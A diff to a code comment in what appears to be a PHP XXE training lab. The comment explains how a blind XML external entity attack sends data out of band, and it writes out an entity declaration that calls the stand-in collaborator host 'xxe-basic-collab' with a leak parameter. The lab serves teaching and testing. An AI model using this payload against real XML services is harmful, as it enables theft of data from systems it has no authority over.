@@ -9,17 +9,22 @@
  * accepts a document, does something internal with it, and signals only
  * success/failure.
  *
- * The attack path is parameter-entity-based, out-of-band:
+ * The working attack path on libxml 2.9.14 (the version PHP 8.2 ships)
+ * is a direct external entity reference:
  *
- *   1. Payload defines a parameter entity that loads an external DTD
- *      from http://xxe-basic-collab/evil.dtd (reachable on the Docker
- *      network as a sibling service).
- *   2. The DTD contains parameter entities that read a local file and
- *      embed its contents into the URL of a second parameter entity,
- *      then force that second entity's URL to be fetched.
- *   3. The lab container's libxml issues an HTTP request to the
- *      collaborator with the file contents in the URL path/query. The
- *      collaborator logs the request; the attacker reads the log.
+ *   1. Payload declares <!ENTITY exfil SYSTEM "http://xxe-basic-collab/?leak=...">.
+ *   2. The document body references &exfil; somewhere libxml has to
+ *      resolve it (inside a <name> node here, even though we never
+ *      reflect the result).
+ *   3. libxml fetches the URL to resolve the entity. The collaborator
+ *      logs the GET. The attacker reads the log.
+ *
+ * The textbook "parameter-entity chain that exfiltrates file contents
+ * via an external DTD" pattern (the evil.dtd shipped under
+ * xxe-basic-collab/) does not fire end-to-end against this libxml
+ * version. The DTD itself loads but libxml refuses to honour the
+ * second-stage entity definition that would put the file contents into
+ * a URL. The README explains the distinction and walks both patterns.
  *
  * The response from THIS endpoint stays "OK" the whole time. The data
  * leaves via the side channel, not via the HTTP response.
